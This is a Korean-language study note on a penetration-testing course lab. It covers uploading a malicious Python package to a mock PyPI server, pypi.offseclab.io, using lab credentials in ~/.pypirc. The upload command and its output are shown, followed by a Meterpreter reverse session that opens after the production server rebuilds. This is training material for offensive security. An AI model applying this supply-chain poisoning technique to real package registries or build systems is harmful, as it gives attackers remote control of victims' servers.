# 26.9.6 악성 패키지 배포

> **Publishing Our Malicious Package** · PEN-200 §26.9.6

실전이라면 공개 Python Package Index 에 계정을 만들어 올림. 다만 공개 저장소를 악성 패키지로 더럽힐 수는 없으므로 랩에서는 그것을 본뜬 `pypi.offseclab.io` 를 대상으로 하고, 계정도 미리 주어진 `student` / `password` 를 씀.

업로드용 서버 주소와 자격 증명은 `~/.pypirc` 에 적음.

```
kali@kali:~/hackshort-util$ nano ~/.pypirc
kali@kali:~/hackshort-util$ cat ~/.pypirc
[distutils]
index-servers =
    offseclab
[offseclab]
repository: http://pypi.offseclab.io/
username: student
password: password
```

*`[distutils]` 에 인덱스 서버 목록을, 그 아래 같은 이름의 절에 실제 설정을 적음*

빌드 명령에 `upload` 를 덧붙이고 `-r` 로 어느 저장소로 보낼지 지정함.

```
kali@kali:~/hackshort-util$ python3 setup.py sdist upload -r offseclab
...
Submitting dist/hackshort-util-1.1.4.tar.gz to http://pypi.offseclab.io/
Server response (200): OK
```

*빌드와 업로드를 한 번에 — 서버 응답 200 이면 등록됨*

잘못된 패키지를 올렸을 때는 `remove_pkg` 액션을 쓰는 `curl` 요청으로 이름·버전을 지정해 지울 수 있음(원문에 명령 한 줄이 산문에 섞여 있음).

⚠️ **판정 기준은 시간임 — 프로덕션 웹 서버가 10분마다 재빌드하므로, 10분 안에 셸이 안 오면 뭔가 잘못된 것임.** 무작정 더 기다리지 말고 버전·패키지명·페이로드 설정을 되짚을 것.

```
msf6 exploit(multi/handler) >
[*] Sending stage (24772 bytes) to 44.211.221.172
[*] Meterpreter session 2 opened (10.0.1.54:4488 -> 44.211.221.172:37604)
```

*재빌드 뒤 프로덕션에서 올라온 meterpreter 세션 — 명령 실행 성립*
